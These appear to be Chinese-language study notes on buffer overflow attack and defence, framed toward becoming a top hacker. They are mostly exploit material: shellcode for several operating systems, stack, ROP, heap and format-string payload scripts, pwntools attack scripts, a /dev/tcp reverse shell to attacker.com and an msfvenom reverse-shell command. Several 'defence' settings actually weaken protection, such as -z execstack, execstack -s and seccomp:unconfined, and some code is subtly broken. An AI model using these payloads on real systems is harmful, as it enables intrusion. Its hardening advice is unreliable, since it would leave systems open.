# 缓冲区溢出深度攻击与防御

## 简介
缓冲区溢出是一种内存漏洞，允许攻击者覆盖相邻内存，改变程序执行流程。

## 漏洞类型

### 1. 栈溢出（Stack Overflow）
```c
// 漏洞代码
void vulnerable(char *str) {
    char buffer[100];
    strcpy(buffer, str);  // 无边界检查
}

// 利用原理
// 覆盖返回地址 → 控制EIP → 执行shellcode
```

### 2. 堆溢出（Heap Overflow）
```c
// 漏洞代码
void vulnerable(char *str) {
    char *buffer = malloc(100);
    strcpy(buffer, str);  // 无边界检查
}

// 利用原理
// 覆盖堆块元数据 → 任意内存写
```

### 3. 格式化字符串（Format String）
```c
// 漏洞代码
printf(user_input);  // 用户输入作为格式字符串

// 利用原理
// %n 写入任意地址
// 泄露栈内存
```

### 4. 整数溢出（Integer Overflow）
```c
// 漏洞代码
short size = -1;
char *buffer = malloc(size);  // 分配极小内存

// 利用原理
// 绕过大小检查 → 堆溢出
```

## 利用技术

### 1. 基础栈溢出
```python
# 简单利用脚本
import struct

def create_payload():
    # 填充到返回地址
    padding = b'A' * 112
    
    # shellcode (Linux x86 exec /bin/sh)
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    
    # 返回地址（需要找到jmp esp地址）
    ret_addr = struct.pack('<I', 0xbfffec10)
    
    return padding + ret_addr + shellcode
```

### 2. ROP（Return-Oriented Programming）
```python
# ROP链示例
rop_chain = [
    # 调用 read(0, buffer, 1000)
    pop_edi_ret,      # pop edi; ret
    buffer_addr,       # 写入地址
    pop_rsi_ret,      # pop rsi; ret
    1000,              # 大小
    pop_rdx_ret,      # pop rdx; ret
    0,                 # fd (stdin)
    read_got,         # read@GOT
]
```

### 3. 堆风水（Heap Feng Shui）
```python
# 堆风水布局
def heap_feng_shui():
    # 1. 预分配填充块
    chunks = [alloc(0x100) for _ in range(5)]
    
    # 2. 释放中间块创造空隙
    free(chunks[2])
    
    # 3. 释放目标块
    free(victim_chunk)
    
    # 4. 重新分配控制内容
    payload = b'A' * 0x100 + p64(target_addr)
    alloc(0x100, payload)
```

### 4. 格式化字符串利用
```python
# 格式化字符串利用
def format_string_exploit():
    # 泄露栈地址
    payload = b'%p ' * 10
    
    # 写入任意地址
    # %n 写入已打印字符数
    payload = b'AAAA' + b'%p' * 10 + b'%n'
    
    # 精确写入
    payload = b'%{}c%{}$n'.format(target_value, offset)
```

## 环境检测与适配

### 1. 检测脚本
```python
#!/usr/bin/env python3
import sys

def check_protections():
    """检测二进制保护机制"""
    protections = []
    
    # PIE检测
    with open(sys.argv[1], 'rb') as f:
        data = f.read()
        if b'\x7fELF' in data:
            if b'PIE' in data:
                protections.append("PIE: Enabled")
            else:
                protections.append("PIE: Disabled")
    
    # NX检测
    if b'GNU_STACK' in data:
        protections.append("NX: Enabled")
    else:
        protections.append("NX: Disabled")
    
    # Canary检测
    if b'__stack_chk_fail' in data:
        protections.append("Stack Canary: Present")
    
    # RELRO检测
    if b'RELRO' in data:
        protections.append("RELRO: Full")
    else:
        protections.append("RELRO: Partial")
    
    for p in protections:
        print(f"[*] {p}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary>")
        sys.exit(1)
    check_protections()
```

### 2. 不同架构利用
```python
# x86 (32-bit)
def x86_payload():
    return struct.pack('<I', address)  # 小端序

# x64 (64-bit)
def x64_payload():
    return struct.pack('<Q', address)  # 8字节

# ARM
def arm_payload():
    # ARM使用不同的指令集
    return b'\x01\x00\xa0\xe3'  # mov r0, #1
```

### 3. 不同操作系统
```python
# Linux shellcode
linux_shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

# Windows shellcode (calc.exe)
windows_shellcode = (
    b'\x31\x33\x90\x90\x90'  # XOR EBX,EBX
    b'\x55\x8b\xec'          # PUSH EBP; MOV EBP,ESP
    # ... 调用 WinExec("calc.exe", 0)
)

# macOS shellcode
macos_shellcode = b'\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe3\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
```

### 4. 不同网络环境
```bash
# 内网利用：直接反弹shell
nc -lvp 4444

# 外网利用：反向shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# 加密通信
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 Encoder=x64/xor LHOST=attacker.com
```

## 防御机制

### 1. 编译器保护
```bash
# 编译时启用保护
gcc -fstack-protector -z execstack -pie -fPIC -o vulnerable vulnerable.c

# 各项保护说明
# -fstack-protector: Stack Canary
# -z execstack: NX禁用
# -pie -fPIC: PIE
# -D_FORTIFY_SOURCE: FORTIFY_SOURCE
```

### 2. ASLR（地址空间布局随机化）
```bash
# 检查ASLR状态
cat /proc/sys/kernel/randomize_va_space

# 启用ASLR
echo 2 > /proc/sys/kernel/randomize_va_space
```

### 3. NX位（不可执行位）
```bash
# 检查NX状态
readelf -l vulnerable | grep STACK

# 启用NX
execstack -s vulnerable
```

### 4. Seccomp（沙箱）
```c
#include <linux/seccomp.h>
#include <sys/prctl.h>

void enable_seccomp() {
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
}
```

### 5. 容器安全
```yaml
# Docker安全配置
security_opt:
  - no-new-privileges:true
  - seccomp:unconfined
cap_drop:
  - ALL
read_only: true
```

## 检测与调试

### 1. GDB调试技巧
```bash
# 启动调试
gdb ./vulnerable

# 设置断点
break vulnerable

# 运行
run < input

# 检查内存
x/100x $esp

# 利用漏洞
run $(python -c "print('A'*112 + '\x10\xec\xff\xbf')")
```

### 2. Pwntools使用
```python
from pwn import *

# 连接远程
p = remote('target.com', 4444)

# 发送payload
p.sendline(cyclic(200))

# 交互
p.interactive()

# 调试模式
p = process('./vulnerable')
gdb.attach(p)
```

### 3. 自动化利用框架
```python
# 使用pwntools自动化
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def exploit():
    p = remote('target.com', 4444)
    
    # 构建payload
    payload = flat({
        112: p64(0x401156)  # ROP gadgets
    })
    
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
```

---
*学习时间: 2026-02-21*
*目标: 成为世界第一黑客*
